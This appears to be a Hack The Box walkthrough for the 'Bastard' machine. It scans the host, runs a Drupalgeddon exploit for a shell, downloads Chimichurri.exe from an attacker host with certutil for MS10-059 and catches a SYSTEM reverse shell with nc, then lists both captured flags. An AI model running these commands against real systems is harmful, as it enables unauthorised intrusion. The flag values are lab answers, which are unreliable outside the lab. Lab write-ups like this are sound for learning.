# Bastard - Medium

```shell
nmap -T4 -p- -A -Pn -v 10.10.10.9

nmap -p 80,135,49154 -Pn --script vuln 10.10.10.9

cmseek
#detects drupal cms on port 80

searchsploit drupal
#check for exploits for version 7

ruby 44449.rb

ruby 44449.rb http://10.10.10.9
#gives drupalgeddon shell

whoami
#iusr

systeminfo

#in attacker machine
vim sysinfo.txt
#copy systeminfo output of victim windows machine

python2 windows-exploit-suggester.py --update

python2 windows-exploit-suggester.py --database 2022-11-13-mssb.xls --systeminfo sysinfo.txt
#lists possible exploits

#trying MS10-059
#in attacker machine
python3 -m http.server

#setup listener
nc -nvlp 6666

#in victim shell
certutil -urlcache -f http://10.10.14.2:8000/Chimichurri.exe chimi.exe

.\chimi.exe 10.10.14.2 6666
#this gives us shell as SYSTEM on listener

whoami
#system
```

* Open ports & services:

  * 80 - http - Microsoft IIS httpd 7.5
  * 135 - msrpc - Microsoft Windows RPC
  * 49154 - msrpc - Microsoft Windows RPC

* Visiting the webpage on port 80 shows that it is using ```drupal```; we can confirm this with the help of ```cmseek``` tool.

* ```cmseek``` shows that the webpage is using Drupal version 7.54; we can look for exploits for this version then.

* Alternatively, we can Google for Drupal version 7 exploits - we get RCE exploits.

* Using a Ruby exploit from Exploit-DB, we manage to get shell as a low-priv user; we can begin enumeration now.

* We can use windows-exploit-suggester by getting ```systeminfo``` from the shell, and feeding the output to the Python script.

* On running the script, we get a list of possible exploits; usual practice is to start from the older ones.

* We can attempt for MS10-059 which allows privesc through ```Chimichurri.exe```.

* After downloading the .exe from GitHub, we can transfer it using ```certutil``` in victim shell, and Python server in attacker machine.

* After setting up our listener, and running the .exe with parameters required, we get reverse shell as System - we can read the flags now.

```markdown
1. User flag - 0797e510cc4518be6718d3055cfe53bc

2. Root flag - 100e1bddc77a9895bcfb427e1754e1f5
```
